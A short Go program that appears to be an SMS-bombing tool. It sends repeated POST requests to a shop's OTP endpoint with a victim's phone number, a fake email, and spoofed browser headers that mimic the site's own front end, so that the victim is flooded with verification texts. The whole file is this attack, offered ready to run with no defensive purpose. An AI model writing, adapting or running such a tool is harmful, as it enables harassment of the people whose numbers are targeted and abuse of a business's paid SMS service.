package main

import (
	"bytes"
	"flag"
	"fmt"

	"net/http"
)

func main() {
	phone := flag.String("phone", "", "Phone number")
	sms := flag.Int("c", 5, "minimum sms count 5")
	flag.Parse()

	if *phone == "" {
		fmt.Println("Please provide a phone number using the -phone flag.")
		return
	}

	for i := 0; i < *sms; i++ {

		url1 := "https://api.miah.shop/api/otp"
		payload := fmt.Sprintf(`{"phone":"%s","email":"arfaf@kasjfa.com"}`, *phone)

		req, err := http.NewRequest("POST", url1, bytes.NewBufferString(payload))
		if err != nil {
			fmt.Println(err)
			return
		}

		req.Header.Set("Host", "api.miah.shop")
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0")
		req.Header.Set("Accept", "application/json, text/plain, */*")
		req.Header.Set("Accept-Language", "en-US,en;q=0.5")
		req.Header.Set("Accept-Encoding", "gzip, deflate")
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("Origin", "https://miah.shop")
		req.Header.Set("Referer", "https://miah.shop/")
		req.Header.Set("Sec-Fetch-Dest", "empty")
		req.Header.Set("Sec-Fetch-Mode", "cors")
		req.Header.Set("Sec-Fetch-Site", "same-site")
		req.Header.Set("Te", "trailers")
		req.Header.Set("Connection", "close")
		req.Header.Set("Content-Length", fmt.Sprint(len(payload)))

		client := &http.Client{}
		resp1, err := client.Do(req)
		if err != nil {
			fmt.Println(err)
			return
		}
		defer resp1.Body.Close()

	}

}
